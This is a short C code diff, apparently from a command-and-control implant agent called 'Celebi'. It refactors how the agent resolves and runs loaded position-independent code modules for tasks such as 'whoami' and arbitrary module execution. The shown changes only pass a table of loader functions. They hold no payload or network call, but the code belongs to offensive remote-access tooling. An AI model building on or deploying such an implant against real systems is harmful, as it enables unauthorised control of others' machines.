@@ -87,7 +87,7 @@ void agent_exit(AgentState *state, TaskInfo *task) {
 
 void agent_whoami(AgentState *state, TaskInfo *task) {
 	ResolvedPico pico = { 0 };
-	BOOL result = resolve_loaded_pico(&state->file_vault, &pico, "_builtin_whoami");
+	BOOL result = resolve_loaded_pico(&state->file_vault, &state->funcs, &pico, "_builtin_whoami");
 	
 	if (result == FALSE) {
 		#ifdef CELEBI_DEBUG
@@ -170,7 +170,7 @@ void agent_execute_pico(AgentState *state, TaskInfo *task) {
 	char *args = MSVCRT$strtok(NULL, "\t");
 	
 	ResolvedPico pico = { 0 };
-	BOOL result = resolve_loaded_pico(&state->file_vault, &pico, name);
+	BOOL result = resolve_loaded_pico(&state->file_vault, &state->funcs, &pico, name);
 	
 	if (result == FALSE) {
 		#ifdef CELEBI_DEBUG
@@ -257,6 +257,12 @@ void go() {
 	
 	#ifdef CELEBI_DEBUG
 	dprintf("Vault allocated.");
+	#endif
+	
+	state.funcs = resolve_pico_functions();
+
+	#ifdef CELEBI_DEBUG
+	dprintf("Resolved PICO loading functions.");
 	#endif
 	
 	load_builtin_picos(&state.file_vault);
